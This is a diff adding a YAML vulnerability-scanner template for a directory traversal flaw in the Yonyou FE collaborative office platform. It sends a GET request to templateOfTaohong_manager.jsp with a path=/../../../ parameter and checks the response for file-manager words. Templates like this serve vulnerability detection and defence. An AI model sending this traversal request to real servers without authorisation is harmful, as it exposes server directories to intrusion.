@@ -1,0 +1,25 @@
+id: yaml-poc-yonyou-fe-directory_traversal-CT-483417
+info:
+  name: Yaml Poc Yonyou Fe Directory_Traversal Ct 483417
+  author: converted
+  severity: medium
+  description: 'Converted from xpoc: yaml-poc-yonyou-fe-directory_traversal-CT-483417'
+  tags: traversal
+  reference:
+  - http://wiki.peiqi.tech/wiki/oa/用友OA/用友%20FE协作办公平台%20templateOfTaohong_manager.jsp%20目录遍历漏洞.html
+http:
+- method: GET
+  path:
+  - /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - /download.fe?filePath=
+    - deletefile
+    - uploadfile
+    - downloadfile
